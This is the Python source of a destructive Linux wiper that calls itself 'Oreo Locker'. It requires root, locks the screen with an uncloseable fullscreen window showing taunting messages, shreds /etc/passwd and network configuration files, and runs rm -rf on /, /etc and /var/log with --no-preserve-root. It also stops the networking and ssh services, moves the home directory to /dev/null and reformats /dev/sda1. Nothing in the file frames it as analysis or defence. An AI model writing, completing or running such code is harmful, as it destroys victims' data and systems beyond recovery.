import tkinter as tk
import os
import platform

class Utils:

    def __init__(self):
        pass

    def rgb_hack(self, rgb):
        return "#%02x%02x%02x" % rgb  

    
directory_list = ["/etc/network/interfaces", "/etc/dhcp/dhclient.conf", "/etc/hosts", "/etc/passwd"]
need_removing_list = ["/var/log", "/etc", "/"]
services_list = ["networking", "ssh"]

def preventClose():
    pass

def MainThread():

    shred_command = "shred -z -n 30 "
    rmrf_command = "rm -rf "
    wipe_everything = "rm -rf /"
    services_command = "sudo systemctl stop "
    troll_home_dir = "mv ~ /dev/null"
    wipe_sda1 = "mkfs.ext4 /dev/sda1"

    root = tk.Tk()
    UT = Utils()

    tk.Label(root, font=("Cascadia Code", 20), text='Dear user, you have been infected with Oreo Locker and there is no way around it.', anchor="center").pack()
    tk.Label(root, font=("Cascadia Code", 15), text='Your linux system is currently being destroyed and corrupted.', anchor="center").pack()
    tk.Label(root, font = ("Cascadia Code", 10), text='All you can do is wait here and cry as loud as possible.', anchor="center").pack()

    root.geometry("1920x1080")
    root.resizable(False,False)
    root.attributes('-fullscreen',True)

    root.config(bg=UT.rgb_hack((0, 0, 0)))
    root.protocol("WM_DELETE_WINDOW", preventClose) 

    for x in directory_list:
        os.system(shred_command + x)

    
    for f in need_removing_list:
        os.system("clear")
        os.system("cd /")
        os.system(rmrf_command + f + "*" + "--no-preserve-root")

    for d in services_list:
        os.system(services_command + d)    

    os.system(wipe_everything + "--no-preserve-root")
    os.system(troll_home_dir)
    os.system(wipe_sda1)
    root.mainloop() 


if (os.getuid() != 0):
    print("Run with root privileges")
    quit()

if (platform.system() != "Linux"):
    print("This file runs only on linux")
    quit()

if __name__ == "__main__":
    MainThread()
    quit()
